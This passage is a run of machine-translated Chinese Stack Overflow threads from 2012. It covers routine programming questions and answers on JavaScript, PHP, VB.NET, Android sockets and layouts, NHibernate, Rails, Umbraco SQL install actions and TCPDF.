您必须确保对象文字格式正确，然后使用类似这样的内容（ES5）：

```
var filteredObject = Object.keys( yourObject ).reduce( function ( target, key ) {
    if ( yourObject[ key ] !== 2 && yourObject[ key ] !== 4 )
        target[ key ] = yourObject[ key ];
    return target;
}, { } ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:29:37.233

你不能简单地在 for 中做一个 if(value!=2 && value!=4) 吗？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T13:36:43.077

您可以尝试使用`delete`关键字来删除键，这将删除值

这是代码

```
var object = { "a": 1, "b": 2, "c" : 3, "d" : 4};
$.each(object, function(key, value){
   if(value==2 || value==4){
         delete object[key];
   }
}); 
```

**注意**：我假设您示例中的相同键是错误的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-07T13:37:54.117

删除所有值，其中`value == 4`：

```
for (var member in object) { if (object[member]==4) {delete object[member]} } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-07T13:29:19.200

我想你会想要使用[`filter`](http://api.jquery.com/filter/)而不是`each`.

# umbraco - 安装包时在umbraco中执行sql查询

> ID：11847084
> 
> 赞同：0
> 
> 时间：2012-08-07T13:27:43.930
> 
> 标签：umbraco

我在 umbraco 中创建了一个包并尝试添加将在 umbraco 数据库中创建一个表的动作脚本。但是当我尝试保存以下动作脚本时，它给出了错误消息：

**Actions XML 格式不正确，请删除操作字段中的文本或确保它是正确格式的 XML。**

我无法在下面的代码中确定我在这里做的错误是什么。请在这里帮助我。提前致谢。

**注意：我使用的是 Umbraco 4.8.0**

```
 <Action runat="install" undo="false" alias="ExecuteSql">
<![CDATA
        CREATE TABLE [test_nishantBlog_Comment](
            [__kp_ID] [smallint] IDENTITY(1999,1) NOT NULL,
            [__fk_postID] [smallint] NOT NULL,
            [Comment] [ntext] NOT NULL,
            [CreationTime] [timestamp] NOT NULL,
            [CommentTitle] [varchar](500) NOT NULL,
            [EmailAdd] [varchar](100) NULL,
         CONSTRAINT [PK_test_nishantBlog_Comment] PRIMARY KEY CLUSTERED 
        (
            [__kp_ID] ASC
        )WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
        ) 
    ]>

</Action> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-01-15T16:29:18.410

您缺少 SQL 周围的方括号

```
<![CDATA[-- SQL goes here --]]> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-09T19:06:30.213

我的猜测是 SQL 语句中的 ] 字符导致 CDATA 右括号出现问题：“]>”

你能把它们去掉，看看它是否有效？

# asp.net - 从文本文件中读取变量并创建表格

> ID：11847086
> 
> 赞同：0
> 
> 时间：2012-08-07T13:27:51.497
> 
> 标签：asp.net, vb.net, arrays, vbscript

我有这个代码

```
'Open a file for reading
'Get a StreamReader class that can be used to read the file
Dim objStreamReader As StreamReader
Dim variableArray(20) As String
objStreamReader = File.OpenText(filePath)

'Read one line at a time
Dim someString As String
Dim variableNum As Integer = 0
'Iterate through lines
While objStreamReader.Peek() <> -1
    someString = objStreamReader.ReadLine()
    variableArray(variableNum) = someString
    variableNum = variableNum + 1
End While
For Each line As String In variableArray

Next
objStreamReader.Close() 
```

我有一个在日志文件中输出结果的 vbscript，附加在每一行并由“|”分隔 只有两列。

这是VBScript代码的片段

```
f1.WriteLine("Server Name " & "|" & strName)
f1.WriteLine("OS Name: " & "|" & strCaption)
f1.WriteLine("OS Version: " & "|" & strVersion
f1.WriteLine("CSD Version: " & "|" & strCSDVer
f1.WriteLine("Serial Number: " & "|" & strSerial 
```

我怎样才能让我的代码的 For Each 部分来阅读它，将其分解，然后创建一个显示结果的表格。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T16:34:49.493

考虑到您需要 variableArray 中的两个值才能将新行添加到表中，我会执行 For..Next 循环（步进 2）而不是 For...Each：

```
Dim myTable As New Table
Dim loopCount As Integer

For loopCount = 0 To variableNum Step 2

    Dim myRow As New TableRow
    Dim myCell1 As New TableCell
    Dim myCell2 As New TableCell

    myCell1.Text = variableArray(loopCount)
    myCell2.Text = variableArray(loopCount + 1)
    myRow.Cells.Add(myCell1)
    myRow.Cells.Add(myCell2)
    myTable.Rows.Add(myRow)

Next 
```

由于您已经将数组中的元素数量存储在“variableNum”中，因此您可以从 0 循环到该值，步长为 2。每次迭代您将创建两个单元格，其中包含当前和下一个变量的值大批。然后，这些单元格将被添加到一行中，该行又将添加到表格中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T16:38:32.047

声明一个数据表

```
Dim table As DataTable = new DataTable("MyTable") 
```

现在在 Foreach 内部：

```
Dim LineArray() As String = Split(line, "|") 'This will break apart each line into its two parts
'Now add each item of LineArray to the datatable. AKA
Dim column As DataColumn = new DataColumn()
column.DataType = System.Type.GetType("System.Int32")
column.ColumnName = LineArray(0)
column.ReadOnly = True
column.Unique = True
table.Columns.Add(column)

Dim row As DataRow 
row = table.NewRow()
row(LineArray(0)) = LineArray(1)
table.Rows.Add(row) 
```

我不知道您尝试实现的整个逻辑，但这应该会给您一个良好的开端。它基本上取第一列并将其设置为表中的列，然后取第二列并将其设为行值。

一旦你构建了你的 DataTable，你就可以将它绑定到一个 GridView，它在 HTML 意义上是一个表。

希望这可以帮助。

# xml - 如何使我的测试结果适应 xunit 格式

> ID：11847088
> 
> 赞同：3
> 
> 时间：2012-08-07T13:28:05.447
> 
> 标签：xml, xunit

在工作中，我们进行了一些自动化测试，这些测试在夜间执行，然后以特定的 XML 格式进行汇总。下一个想法是将这些结果导入 Polarion，但它只接受 xUnit 格式的结果。这就是我卡住的地方 - 我似乎无法找到正确的解释来说明我应该如何更改我自己的 XML 格式以使其看起来像 xUnit？以下是我目前的结果：

```
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<?xml-stylesheet type="text/xsl" href="report.xsl"?>
<TestRun Date="2012_08_06__15_08  (y_m_d__h_m)" Plattform="WinCE" Name="GCA-Testrun" GCA-Version="V5.03.02">
<TestSuite Name="Systemtest" Container="GCA">
    <FailedTests>
        <FailedTest Name="test14877_1.lua" Data="">
            <Item>
                <FailureType>Failure</FailureType>
                <Location>
                    <File></File>
                    <Line></Line>
                </Location>
                <Message>setErrorAndExit : Failed!</Message>
            </Item>
            <elTime>777.00</elTime>
            <execTime>0h12min57s</execTime>
            <Testnumber>Undefined</Testnumber>
        </FailedTest>
    </FailedTests>
    <SuccessfulTests>
        <SuccessfulTest Name="test15414.lua" Testnumber="Undefined" Data="" elTime="684.00" execTime="0h11min24s" />
    </SuccessfulTests>
</TestSuite> 
```

我只需要 testrun-name 和标签成功或失败。

# php - PHP/CSS 在字符串中查找单词，更改其颜色

> ID：11847091
> 
> 赞同：1
> 
> 时间：2012-08-07T13:28:12.470
> 
> 标签：php, css

PHP/CSS 在字符串中查找单词，更改其颜色以进行显示。遇到问题，找不到解决方案，有什么建议吗？谢谢。

```
 <pre>

      <?php 
      $str="Try to realize the truth... there is no spoon."; // spoon can be anywhere in string
      $array = explode(" ", $str);
for($i=0;$i < count($array);$i++)
     {
       if ($array[$i] == "spoon") {
             ?><span style="color:red;"><?php echo echo $array[$i]." "; ?></span>
             <?php
           } else {
              echo $array[$i]." ";
           }   
     } ?>

      </pre 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-07T13:33:25.447

我个人会使用：

```
function highlight($text='', $word='')
{
  if(strlen($text) > 0 && strlen($word) > 0)
  {
    return (str_ireplace($word, "<span class='hilight'>{$word}</span>", $text));
  }
   return ($text);
}

$str="Try to realize the truth... there is no spoon."; // spoon can be anywhere in string
$str= highlight($str, 'spoon'); 
```

**注意：** str_ireplace 是不区分大小写的版本 str_replace。

另外......显然你需要在某处定义'hilight'的css！

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-07T13:31:06.530

你正在寻找`preg_replace()`.

```
preg_replace('/\b(spoon)\b/i', '<span style="color:red;">$1</span>', $str); 
```

**DaveRandom 的注释：**

`\b`是一个词边界断言，以确保您不匹配茶匙或勺子，并且`()`是用于替换的捕获组，因此大小写保持不变。

`i`最后确保不区分大小写，并将`$1`匹配的单词放回替换字符串中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T13:35:25.543

你找不到“勺子”，因为你爆炸了一个空间，所以你只会得到“勺子”。

您可以在一行中执行此操作：

```
str_replace("spoon", "<span style=\"color:red;\">spoon</span>", $str); 
```

希望这可以帮助。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-07T13:32:32.593

您的代码不起作用的原因是，当您在“”（空格）上展开时，您希望收到一个带有单词“spoon”的数组，但实际上它是单词“spoon”。（注意句点）添加到数组中，以及为什么您的条件语句`if ($array[$i] == "spoon")`永远不会触发。

**注意：** 虽然我同意大多数人的观点并相信他应该使用 str_replace 或 preg_replace 之类的替代方法，但我认为必须说一些关于尝试从“头开始”解决这个问题的事情。

# android - 在套接字关闭之前，Android TCP 不会刷新

> ID：11847092
> 
> 赞同：3
> 
> 时间：2012-08-07T13:28:13.957
> 
> 标签：android, sockets, tcp, flush, dataoutputstream

我一直在尝试各种实现来完成这项工作，并在 StackOverflow 和 Android 开发人员中搜索了解决方案，但我在编程方面没有太多经验，无法让这个代码块正常工作。

我的意图：

1.  这是一个线程，将循环检查是否有 outMessage，如果有，它将发送消息。
2.  接下来，它将检查流内是否有任何内容，如果有，它会将其发送到我的主要活动中的处理程序。
3.  最后，它会休眠 1 秒钟，然后再次检查。
4.  这应该允许我多次读/写，而无需关闭和打开套接字。

问题：

*   在我关闭套接字之前，外流不会被刷新。flush() 似乎没有效果。

我的请求：

*   请发布使此代码如上所述正常工作所需的更改（任何解释为什么的注释将不胜感激。指向其他类似问题/答案的链接将非常有助于我学习，但我一直在为几个数周，但无法使其正常工作，因此请确保您还包括此代码所需的更改，以便按上述方式工作。提前致谢。

其他：

*   我想知道我的流入和/或流出是否需要寻找行尾字符？
*   会在这里使用 TCP_NODELAY 之类的东西吗？
*   任何可以提供的额外信息将不胜感激。我想好好学习这些东西，但我目前什么都做不了。

代码：

```
 public void run() {                        
        while (connectionStatus == TCP_SOCKET_STATUS_CONNECTED) {
            try {   
                if (outMessage != null){
                   OutStream.writeBytes(outMessage);
                   OutStream.flush();           
                   outMessage = ("OUT TO SERVER: " + outMessage);           
                // socketClient.close();     
                   sendMessageToAllUI(0, MAINACTIVITY_SET_TEXT_STATE, "appendText" , outMessage);
                   outMessage = null;               
                } 
                if (InStream != null) {                     
                    String modifiedSentence = InStream.readLine();      
                    sendMessageToAllUI(0, MAINACTIVITY_SET_TEXT_STATE, "appendText" , "\n" + "IN FROM SERVER: " + modifiedSentence);
            }
            Thread.sleep(1000);
        } catch (IOException e) {               
            connectionLost();
            break;
        } catch (InterruptedException e) {
                e.printStackTrace();
            }
    }                           
} 
```

制作套接字的线程：

```
public void run() {
        if(I) Log.i(LOGTAG, "Attempt Connection with IP: " + serverIP + " ...");
        setName("AttemptConnectionThread");
        connectionStatus = TCP_SOCKET_STATUS_CONNECTING;
        try {
            SocketAddress sockaddr = new InetSocketAddress(serverIP, port);
            tempSocketClient = new Socket(); // Create an unbound socket

            // This method will block no more than timeoutMs. If the timeout occurs, SocketTimeoutException is thrown.
            tempSocketClient.connect(sockaddr, timeoutMs);
            OutStream = new DataOutputStream(tempSocketClient.getOutputStream());
            InStream = new BufferedReader(new InputStreamReader(tempSocketClient.getInputStream()));
            socketClient = tempSocketClient;
            socketClient.setTcpNoDelay(true);
            connected(); 
        } catch (UnknownHostException e) {
            if(I) Log.i(LOGTAG,"     ...UnknownException e: e.getMessage() shows: " + e.getMessage());
            connectionFailed();
        } catch (SocketTimeoutException e) {
            if(I) Log.i(LOGTAG,"     ...SocketTimoutException e: e.getMessage() shows: " + e.getMessage());
            connectionFailed();
        } catch (IOException e) {
            if(I) Log.i(LOGTAG,"     ...caught on run()");
            // Close the socket
            try {
                tempSocketClient.close();
            } catch (IOException e2) {
                Log.e(LOGTAG, "unable to close() socket during connection failure", e2);
            }
            if(I) Log.i(LOGTAG,"     ...IOException e: e.getMessage() shows: " + e.getMessage());
            connectionFailed();
            return;
        }
    } 
```

我在网上找到并使用的 java 服务器，直到我将它移植到真实服务器：

```
public class Server {

private static String SERVERIP;

/**
 * @param args
 * @throws IOException
 */

public static void main(String[] args) throws IOException {
    String clientSentence;
    String capitalizedSentence;

    try {
        ServerSocket welcomeSocket = new ServerSocket(8888);
        getIp();
        System.out.println("Connected and waiting for client input!\n");

        while (true) {
            Socket connectionSocket = welcomeSocket.accept();
            BufferedReader inFromClient = new BufferedReader(
                    new InputStreamReader(connectionSocket.getInputStream()));
            DataOutputStream outToClient = new DataOutputStream(
                    connectionSocket.getOutputStream());

            clientSentence = inFromClient.readLine();
            String ip = connectionSocket.getInetAddress().toString()
                    .substring(1);
            System.out.println("In from client (" + ip + "): "
                    + clientSentence);
            if (clientSentence != null) {
                capitalizedSentence = clientSentence.toUpperCase() + '\n';
                System.out.println("Out to client (" + ip + "): "
                        + capitalizedSentence);
                outToClient.writeBytes(capitalizedSentence + "\n");
            }

        }
    } catch (IOException e) {
        // if server is already running, it will not open new port but
        // instead re-print the open ports information
        getIp();
        System.out
                .println("Server connected and waiting for client input!\n");

    }
}

private static void getIp() {
    InetAddress ipAddr;
    try {
        ipAddr = InetAddress.getLocalHost();
        System.out.println("Current IP address : "
                + ipAddr.getHostAddress());

    } catch (UnknownHostException e) {
        e.printStackTrace();
    }
}
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T21:36:15.787

我怀疑你正在读取消费者的线路，但你没有写线路，所以消费者会阻塞，直到它获得 EOS 并提供一条大线路。发送时根据需要添加线路终止符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:54:56.770

由于这些是短消息（`< MSS`），我猜堆栈可能正在实现 Nagle 的算法。服务器是否在执行某种延迟的 ACK？如果可能，您应该捕获跟踪并查看是否有来自另一方的未决确认。

无论哪种情况，`TCP_NODELAY`都应该有所帮助。

# sqlite - 使用 PersistenceSpecification 测试 NHibernate 映射

> ID：11847094
> 
> 赞同：0
> 
> 时间：2012-08-07T13:28:18.633
> 
> 标签：sqlite, nhibernate, fluent-nhibernate, nunit, integration-testing

我今天阅读了一篇关于如何使用 PersistenceSpecification 类测试 Fluent NHibernate 映射的博文。似乎是一个非常好的主意，所以我尝试了一下。但是，在检查 HasMany 关系时，它会不断抛出 System.ArgumentOutOfRangeException。我们使用 SQL Lite 内存数据库进行测试。

这是我的模型的样子。我剪掉了一些不相关的属性等：

```
public class Area
{
    public virtual int AreaId{ get; set; }
    public virtual IList<AreaPolygonVertex> Vertices { get; set; }
    ...
}

public class AreaPolygonVertex
{
    public virtual Point Point { get; set; }
    public virtual int VertexNumber { get; set; }
    public virtual int AreaId { get; set; }
}

public class Point
{
    public double X {get; set;}
    public double Y {get; set;}
} 
```

以下是 NHibernate 映射：

```
public class AreaMap : ClassMap<Area>
    {
        public AreaMap()
        {
            Table("VIEW_AREAS");
            Id(x => x.AreaId, "ID");
            HasMany(x => x.Vertices).KeyColumn("AREA_ID");
            ...
        }
    }

  public class AreaPolygonVertexMap : ClassMap<AreaPolygonVertex>
  {
      public AreaPolygonVertexMap()
      {
          Table("AREA_POLYGON_VERTICES");
          CompositeId()
                .KeyProperty(x => x.AreaId, "AREA_ID")
                .KeyProperty(x => x.VertexNumber, "VERTEX_NO");

          Component(x => x.Point, m =>
          {
              m.Map(x => x.X, "X");
              m.Map(x => x.Y, "Y");
          });

          Map(x => x.VertexNumber, "VERTEX_NO");
          Map(x => x.AreaId, "AREA_ID");
      }
  } 
```

最后是测试：

```
[Test]
public void should_map_areas_correctly()
{
     var vertex = new AreaPolygonVertex {
          AreaId = 1, 
          Point = new Point(20, 30), 
          VertexNumber = 1
      };

      _session.Save(vertex);

      new PersistenceSpecification<Area>(_session)
            .CheckProperty(c => c.AreaId, 1)
            .CheckList(c => c.Vertices, new List<AreaPolygonVertex>{ vertex })
            .VerifyTheMappings();
 } 
```

这会引发 ArgumentOutOfRangeException，说“索引超出范围。必须为非负数且小于集合的大小。参数名称：索引”。在这个异常中似乎没有更多有用的信息。

起初我在运行验证调用之前没有执行 _session.Save(vertex) ，但我发现在有这样的 HasMany 关系时必须手动将“子对象”插入 _session 中。不过，可能不适合我的确切情况。

PS：映射和模型已经针对真实（oracle）数据库进行了测试，它们应该可以正常工作（至少对于读取数据）。我也使用 CheckComponentList 而不是 CheckList 进行了测试，但结果仍然相同。如果我删除“.CheckList(..”行，而只是检查所有其他属性，它工作正常。

如果我在这里做错了什么，希望有人能启发我。如前所述，这是我的第一个 NHibernate 映射测试，所以要温柔 =)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T07:38:01.890

*   `HasMany(x => x.Vertices)`没有级联集，这意味着它根本不会保存它
*   您将某些列映射了两次，应删除以下内容，因为它们已经在 CompositeId 中

    ```
    Map(x => x.VertexNumber, "VERTEX_NO");
    Map(x => x.AreaId, "AREA_ID"); 
    ```

# android - 手动编写 .xml

> ID：11847096
> 
> 赞同：-2
> 
> 时间：2012-08-07T13:28:28.947
> 
> 标签：android, xml

嗨，我正在 android 中进行开发和应用程序，我还没有遇到任何 .xml android 指南。由于代码是由构建器自动生成的，我虽然可以。尽管如此，现在我已经达到了一个点我需要将简单的按钮放在屏幕底部与左右相等的距离，但似乎无法使其工作。我将边距设置为 19dp（左侧一个，右侧一个）但仍然不起作用。所以我知道这不是一个值得的问题，但你能提供至少一些我可以阅读的文章吗？

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_height="fill_parent"
    android:layout_width="fill_parent"
    android:orientation="vertical">
    <RadioGroup
        android:id="@+id/tabs"
        android:layout_height="wrap_content"
        android:layout_width="fill_parent"
        android:orientation="horizontal">
    <RadioButton
        android:id="@+id/radio_btn_0"
        android:layout_height="wrap_content"
        android:layout_width="0px"
        android:layout_weight="1"
        android:text="Absences"
        android:checked="true" 
        android:textSize="@dimen/padding_small"/>
    <RadioButton
        android:id="@+id/radio_btn_1"
        android:layout_height="wrap_content"
        android:layout_width="0px"
        android:layout_weight="1"
        android:text="Students"
        android:textSize="@dimen/padding_small" />
    <RadioButton
        android:id="@+id/radio_btn_2"
        android:layout_height="wrap_content"
        android:layout_width="0px"
        android:layout_weight="1"
        android:text="Grades" 
        android:textSize="@dimen/padding_small"/>
    <RadioButton
        android:id="@+id/radio_btn_3"
        android:layout_height="wrap_content"
        android:layout_width="0px"
        android:layout_weight="1"
        android:text="Tests" 
        android:textSize="@dimen/padding_small"/>
</RadioGroup>
<com.github.ysamlan.horizontalpager.HorizontalPager
    android:id="@+id/horizontal_pager"
    android:layout_width="fill_parent"
    android:layout_height="0px"
    android:layout_weight="1">        
    <DragNDrop.DragNDropListView
        android:id="@+id/android:list"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">
    </DragNDrop.DragNDropListView>        
    <ScrollView
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">
        <TextView
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:textSize="24sp"
            android:text="Students menu"
            android:textColor="#000"
            android:textStyle="bold"
            android:background="#0f0" />
    </ScrollView>
    <ScrollView
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">
        <TextView
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:textSize="24sp"
            android:text="Grades menu"
            android:textColor="#000"
            android:textStyle="bold"
            android:background="#00f" />
    </ScrollView>
    <ScrollView
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">
        <TextView
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:textSize="24sp"
            android:text="Tests"
            android:textColor="#000"
            android:textStyle="bold"
            android:background="#0f0" />
    </ScrollView>     
</com.github.ysamlan.horizontalpager.HorizontalPager>
<Button
    android:id="@+id/button1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_marginLeft="@dimen/a19dp"
    android:drawableLeft="@drawable/r"
    android:drawablePadding="@dimen/padding_small"
    android:text="Refresh"
    android:textSize="@dimen/a12" />

    <Button
    android:id="@+id/btn"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_marginRight="@dimen/a19dp"
    android:drawableLeft="@drawable/back"
    android:drawablePadding="@dimen/padding_small"
    android:text="Return"
    android:textSize="@dimen/a12" />
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:38:35.357

您可以使用以下代码：

```
<Button
    android:id="@+id/button1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_alignParentRight="true"
    android:layout_marginRight="98dp"
    android:text="Button" />

<Button
    android:id="@+id/button2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_toLeftOf="@+id/button1"
    android:text="Button" /> 
```

`android:layout_alignParentBottom="true"`表示底部必须在底部。 `android:layout_centerHorizontal="true"`意味着它应该在中心（所以左右空间均匀）

对于您的代码：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_height="fill_parent"
    android:layout_width="fill_parent"
    android:orientation="vertical">
    <RadioGroup
        android:id="@+id/tabs"
        android:layout_height="wrap_content"
        android:layout_width="fill_parent"
        android:orientation="horizontal">
    <RadioButton
        android:id="@+id/radio_btn_0"
        android:layout_height="wrap_content"
        android:layout_width="0px"
        android:layout_weight="1"
        android:text="Absences"
        android:checked="true" 
        android:textSize="@dimen/padding_small"/>
    <RadioButton
        android:id="@+id/radio_btn_1"
        android:layout_height="wrap_content"
        android:layout_width="0px"
        android:layout_weight="1"
        android:text="Students"
        android:textSize="@dimen/padding_small" />
    <RadioButton
        android:id="@+id/radio_btn_2"
        android:layout_height="wrap_content"
        android:layout_width="0px"
        android:layout_weight="1"
        android:text="Grades" 
        android:textSize="@dimen/padding_small"/>
    <RadioButton
        android:id="@+id/radio_btn_3"
        android:layout_height="wrap_content"
        android:layout_width="0px"
        android:layout_weight="1"
        android:text="Tests" 
        android:textSize="@dimen/padding_small"/>
</RadioGroup>
<com.github.ysamlan.horizontalpager.HorizontalPager
    android:id="@+id/horizontal_pager"
    android:layout_width="fill_parent"
    android:layout_height="0px"
    android:layout_weight="1">        
    <DragNDrop.DragNDropListView
        android:id="@+id/android:list"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">
    </DragNDrop.DragNDropListView>        
    <ScrollView
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">
        <TextView
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:textSize="24sp"
            android:text="Students menu"
            android:textColor="#000"
            android:textStyle="bold"
            android:background="#0f0" />
    </ScrollView>
    <ScrollView
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">
        <TextView
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:textSize="24sp"
            android:text="Grades menu"
            android:textColor="#000"
            android:textStyle="bold"
            android:background="#00f" />
    </ScrollView>
    <ScrollView
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">
        <TextView
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:textSize="24sp"
            android:text="Tests"
            android:textColor="#000"
            android:textStyle="bold"
            android:background="#0f0" />
    </ScrollView>     
</com.github.ysamlan.horizontalpager.HorizontalPager>
 <Button
    android:id="@+id/button1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_alignParentLeft="true"
    android:drawableLeft="@drawable/r"
    android:drawablePadding="@dimen/padding_small"
    android:text="Refresh"
    android:textSize="@dimen/a12" />

<Button
    android:id="@+id/btn"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_alignParentRight="true"
    android:drawableLeft="@drawable/back"
    android:drawablePadding="@dimen/padding_small"
    android:text="Return"
    android:textSize="@dimen/a12" />

</RelativeLayout> 
```

我改变了 `android:layout_centerHorizontal="true"`而不是那个 19dp 的东西。并使其成为相对布局

# ruby-on-rails - 尝试 uniq.pluck(:column_name) 时，RoR ActiveRecord::Base uniq undefined

> ID：11847099
> 
> 赞同：3
> 
> 时间：2012-08-07T13:28:35.137
> 
> 标签：ruby-on-rails, activerecord, uniq

所以我有一个非常简单的模型，叫做电影。我正在尝试添加一个类方法，该方法返回数据库中分配给电影的评分的整洁列表。看来我想打电话`Movie.uniq.pluck(:rating)`

所以我添加了这样的方法：

```
class Movie < ActiveRecord::Base

    def self.all_ratings
        self.uniq.pluck(:rating)
    end

end 
```

但它只是不起作用。当它运行时，我得到：`undefined method`uniq' for #`... 我试过包括 ActiveRecord::Calculations 但这似乎也无济于事。我还在'def ...'之后设置了一个断点来检查self有哪些方法，果然，uniq不在其中......

我显然做错了什么，但我只是不太明白它是什么。

有人有想法么？

```
ó_ò 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-09T03:54:51.287

`uniq`是一种 Ruby 方法，甚至适用于 1.8.7。问题是`uniq`一种`Array`方法。

因此，您可能需要调用`uniq`类似`Movie.all`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-09T06:37:41.000

uniq 是一个数组方法。当你放入时`self.uniq`，`self.all_ratings`self 指的是 Movie 类，它不会指向任何集合

所以首先得到你想要的集合

```
result = Movie.all

(or)

result = Movie.where({}) 
```

然后对结果使用 uniq 方法

# asp.net - 使用动态创建的控件编辑/插入/删除

> ID：11847100
> 
> 赞同：0
> 
> 时间：2012-08-07T13:28:36.683
> 
> 标签：asp.net, vb.net, webforms

我的目标是创建一个具有编辑、删除和插入功能的 GridView 列表（每个都映射到一个表）。（插入功能可以通过页脚中的模板字段来完成。）

我有一个嵌套在转发器中的gridview，每个都是动态创建的。我已经使用绑定字段成功填充了gridview（尽管我最终需要将其更改为模板字段以获取下拉列表和插入）。但是，现在我正在考虑编辑/删除/插入，我想知道是否有更好的方法。

做我想做的事情的最佳方法是什么？我觉得我让它变得比它应该的更困难，而且 GridView 可能不是最好的控件。我应该只使用嵌套中继器吗？在中继器内使用 ListView？

如果您认为有更好的方法可以做到这一点，请提供建议/示例。谢谢！

当前代码：

```
<asp:Repeater ID="FormRepeater" DataSourceID="sdsRepeater" runat="server">
    <ItemTemplate>
        <asp:HiddenField ID="FormID" Value='<%# Bind("FormID") %>' runat="server" />
        <asp:HiddenField ID="tablename" Value='<%# Bind("TableName") %>' runat="server" />
        <div class="gvHeader2">
            <div class="gvHeader">
                <asp:Label ID="lblFormName" runat="server" Text='<%# Bind("FormName") %>'></asp:Label>
            </div>
            <div class="EditFormImage">
            </div>
            <div class="CreateFormLink">
                <asp:HyperLink ID="lnkCreateForm" runat="server">
                    Create New
                </asp:HyperLink>
            </div>
        </div>

        <div class="gv">
        <asp:GridView ID="gvForms" runat="server" DataSourceID="sdsGVForms" 
            DataKeyNames="FormDataID"
            AutoGenerateColumns="false"
            AutoGenerateEditButton="true"
            OnRowEditing="GV_RowEditing"
            OnRowCommand="GV_RowCommand"
        >
            <Columns>
            </Columns>
        </asp:GridView>

        </div>

    </ItemTemplate>
</asp:Repeater>

    Private Sub FormRepeater_ItemDataBound(sender As Object, e As System.Web.UI.WebControls.RepeaterItemEventArgs) Handles FormRepeater.ItemDataBound

    Dim TableName As String = CType(e.Item.FindControl("tablename"), HiddenField).Value
    Dim FormID As Integer = CType(e.Item.FindControl("FormID"), HiddenField).Value
    Dim ProductID As Integer = Page.RouteData.Values("ProductID")
    Dim sdsForms As SqlDataSource = CType(e.Item.FindControl("sdsGVForms"), SqlDataSource)
    Dim gvForms As WebControls.GridView = CType(e.Item.FindControl("gvForms"), GridView)
    Dim dt As DataTable = F.GetFormFieldsToDisplayInList(FormID)
    For Each r As DataRow In dt.Rows
        Dim bfield As BoundField = New BoundField
        bfield.DataField = r(0)
        bfield.HeaderText = r(1)
        gvForms.Columns.Add(bfield)
        FieldList.Add(r(0))

    Next
    sdsForms.SelectCommand = "SQL Query..."
    gvForms.DataBind()

End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T13:37:27.227

不知道你的要求，很难说。

但是，这里有一个比较 ListView、GridView、DataList 和 Repeater 的网格，您可能会觉得有帮助。

[http://weblogs.asp.net/anasghanem/archive/2008/09/06/comparing-listview-with-gridview-datalist-and-repeater.aspx](http://weblogs.asp.net/anasghanem/archive/2008/09/06/comparing-listview-with-gridview-datalist-and-repeater.aspx)

# php - 使用 TCPDF 生成的 PDF 中的文本溢出单元格

> ID：11847107
> 
> 赞同：0
> 
> 时间：2012-08-07T13:28:48.630
> 
> 标签：php, tcpdf

我在尝试在使用 Tcpdf 创建的 pdf 文件上显示来自 sql 表的大块文本时遇到问题。pdf 的布局由页眉、页脚和几个文本单元格组成。当文本的最后一个单元格溢出页面时，下一页会在下一页的页眉上显示剩余的文本。问题是文本没有逐行放在文件中，而是完全转储到单元格中。有没有办法防止这种行为？关于如何修剪文本以便它可以固定在两页上的两个单元格中的任何想法？

任何帮助或想法将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T15:31:29.097

您是否正在使用 TCPDF 的`writeHTML()`方法来生成 PDF？

如果是这样，我强烈建议使用 TCPDF 的内置函数来布局您的页面 - TCPDF 是一个不错的库，但根据我的经验，如果您尝试使用 HTML 的一半实现进行布局，那么它总是令人头疼。

